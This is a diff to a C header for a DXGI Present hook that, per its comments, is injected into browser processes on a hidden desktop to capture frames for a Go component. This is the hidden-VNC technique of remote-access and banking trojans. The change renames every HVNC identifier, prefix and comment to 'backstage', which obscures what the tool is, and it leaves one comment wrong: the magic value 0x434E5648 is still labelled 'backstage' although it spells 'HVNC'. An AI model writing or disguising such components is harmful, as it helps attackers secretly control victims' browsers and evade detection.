@@ -1,15 +1,15 @@
 //===============================================================================================//
-// BackstageCapture — DXGI SwapChain::Present hook for fast HVNC frame capture.
+// BackstageCapture — DXGI SwapChain::Present hook for fast backstage frame capture.
 //
 // Injected into browser processes running on the hidden desktop. Hooks
 // IDXGISwapChain::Present to intercept rendered frames, copies the backbuffer
 // to a named shared-memory section so the Go capture thread can read them
 // directly instead of using the slow PrintWindow API.
 //
-// Shared memory layout (HVNCFrameHeader at offset 0, then pixel data):
-//   [HVNCFrameHeader][BGRA pixel data, stride-aligned rows]
+// Shared memory layout (backstageFrameHeader at offset 0, then pixel data):
+//   [backstageFrameHeader][BGRA pixel data, stride-aligned rows]
 //
-// Signaling: named event "Local\hvnc_frame_{pid}" is set after each new frame.
+// Signaling: named event "Local\backstage_frame_{pid}" is set after each new frame.
 //===============================================================================================//
 #ifndef _DXGI_CAPTURE_H
 #define _DXGI_CAPTURE_H
@@ -33,7 +33,7 @@ void RemoveDXGICapture(void);
 // Shared memory header — must match Go-side definition exactly.
 #pragma pack(push, 1)
 typedef struct {
-    UINT32 magic;       // 'HVNC' = 0x434E5648
+    UINT32 magic;       // 'backstage' = 0x434E5648
     UINT32 version;     // 1
     UINT32 width;
     UINT32 height;
@@ -43,19 +43,19 @@ typedef struct {
     UINT64 timestampNs; // QueryPerformanceCounter-based nanoseconds
     UINT32 pid;         // process ID that produced this frame
     UINT32 reserved;    // alignment padding
-} HVNCFrameHeader;
+} backstageFrameHeader;
 #pragma pack(pop)
 
-#define HVNC_FRAME_MAGIC  0x434E5648  // 'HVNC'
-#define HVNC_FRAME_VERSION 1
+#define backstage_FRAME_MAGIC  0x434E5648  // 'backstage'
+#define backstage_FRAME_VERSION 1
 
 // Maximum frame dimensions we support (prevents runaway allocation)
-#define HVNC_MAX_WIDTH  7680
-#define HVNC_MAX_HEIGHT 4320
+#define backstage_MAX_WIDTH  7680
+#define backstage_MAX_HEIGHT 4320
 
 // Shared memory name format — {pid} is the decimal process ID
-// e.g. "Local\hvnc_frame_12345"
-#define HVNC_SHM_PREFIX   "Local\\hvnc_frame_"
-#define HVNC_EVENT_PREFIX  "Local\\hvnc_evt_"
+// e.g. "Local\backstage_frame_12345"
+#define backstage_SHM_PREFIX   "Local\\backstage_frame_"
+#define backstage_EVENT_PREFIX  "Local\\backstage_evt_"
 
 #endif // _DXGI_CAPTURE_H
